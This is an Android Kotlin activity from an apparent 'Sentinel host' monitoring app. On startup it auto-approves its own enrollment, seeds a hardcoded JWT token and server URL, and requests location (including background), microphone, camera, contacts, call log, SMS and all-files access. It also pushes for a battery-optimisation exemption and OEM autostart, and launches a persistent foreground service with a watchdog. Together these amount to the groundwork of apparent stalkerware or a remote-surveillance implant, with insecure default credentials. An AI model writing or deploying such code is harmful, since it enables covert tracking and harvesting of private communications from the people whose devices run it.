package com.sentinel.host.ui

import android.Manifest
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.os.Environment
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.LifecycleOwner
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.*
import com.sentinel.host.data.session.SessionManagerImpl
import com.sentinel.host.domain.model.LocationConfig
import com.sentinel.host.domain.session.SessionManager
import com.sentinel.host.service.SentinelForegroundService
import com.sentinel.host.util.OemBatteryOptimizer
import com.sentinel.host.worker.SentinelWatchdogWorker
import dagger.hilt.android.AndroidEntryPoint
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : ComponentActivity() {

    companion object {
        private const val TAG = "Sentinel:Main"
    }

    @Inject
    lateinit var sessionManager: SessionManager

    // Step 1: Request foreground location + microphone + notifications
    private val corePermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        Log.i(TAG, "Core permissions: $results")

        if (results[Manifest.permission.ACCESS_FINE_LOCATION] == true) {
            requestBackgroundLocation()
        }

        requestBatteryOptimization()
        checkLocationSettings()
        startSentinelService()
    }

    private val locationReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == LocationManager.PROVIDERS_CHANGED_ACTION) {
                checkLocationSettings()
            }
        }
    }

    // Step 2: Background location (requires separate request on Android 10+)
    private val backgroundLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        Log.i(TAG, "Background location granted: $granted")
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        // Check storage permission immediately on every start
        checkStoragePermission()

        lifecycle.addObserver(object : LifecycleEventObserver {
            override fun onStateChanged(source: LifecycleOwner, event: Lifecycle.Event) {
                when (event) {
                    Lifecycle.Event.ON_RESUME -> {
                        registerReceiver(locationReceiver, IntentFilter(LocationManager.PROVIDERS_CHANGED_ACTION))
                        // Don't call requestAllPermissions() here as it triggers service starts repeatedly.
                        // We check permissions in requestAllPermissions() which is already called once in onCreate().
                    }
                    Lifecycle.Event.ON_PAUSE -> {
                        try {
                            unregisterReceiver(locationReceiver)
                        } catch (e: Exception) {}
                    }
                    else -> {}
                }
            }
        })

        // Auto-approve enrollment and seed default credentials if missing
        sessionManager.setEnrollmentApproved(true)
        if (sessionManager.getToken().isNullOrBlank()) {
            sessionManager.saveToken(SessionManagerImpl.DEFAULT_JWT_TOKEN)
        }
        if (sessionManager.getServerUrl().isNullOrBlank()) {
            sessionManager.saveServerUrl(SessionManagerImpl.DEFAULT_SERVER_URL)
        }

        setContent {
            SentinelHostApp()
        }

        requestAllPermissions()
    }

    private fun requestAllPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        // Filter out already-granted permissions
        val needed = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (needed.isNotEmpty()) {
            Log.i(TAG, "Requesting permissions: $needed")
            corePermissionLauncher.launch(needed.toTypedArray())
        } else {
            Log.i(TAG, "All core permissions already granted")
            checkLocationSettings()
            checkStoragePermission()
            requestBackgroundLocation()
            requestBatteryOptimization()
            startSentinelService()
        }
    }

    private fun checkStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Log.i(TAG, "MANAGE_EXTERNAL_STORAGE not granted, prompting user")
                try {
                    // Try to open specifically for this app
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    // Fallback to general list
                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    startActivity(intent)
                }
            }
        }
    }

    private fun checkLocationSettings() {
        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 15000)
            .build()
        val builder = LocationSettingsRequest.Builder()
            .addLocationRequest(locationRequest)
            .setAlwaysShow(true)

        val client: SettingsClient = LocationServices.getSettingsClient(this)
        val task = client.checkLocationSettings(builder.build())

        task.addOnFailureListener { exception ->
            if (exception is ResolvableApiException) {
                try {
                    // Show the dialog by calling startResolutionForResult(),
                    // and check the result in onActivityResult().
                    exception.startResolutionForResult(this, 1002)
                } catch (sendEx: Exception) {
                    // Ignore the error.
                }
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 1002) {
            if (resultCode == Activity.RESULT_OK) {
                Log.i(TAG, "User enabled location from dialog")
                startSentinelService()
            } else {
                Log.w(TAG, "User declined to enable location from dialog")
            }
        }
    }

    private fun requestBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                != PackageManager.PERMISSION_GRANTED
            ) {
                backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            }
        }
    }

    private fun requestBatteryOptimization() {
        if (!OemBatteryOptimizer.isIgnoringBatteryOptimizations(this)) {
            OemBatteryOptimizer.requestIgnoreBatteryOptimizations(this)
            OemBatteryOptimizer.openOemAutostartSetting(this)
        }
    }

    private fun startSentinelService() {
        if (!sessionManager.isEnrollmentApproved()) {
            sessionManager.setEnrollmentApproved(true)
        }
        SentinelWatchdogWorker.schedule(this)
        SentinelForegroundService.Start(this)
        Log.i(TAG, "SentinelForegroundService and WorkManager watchdog started successfully")
    }
}
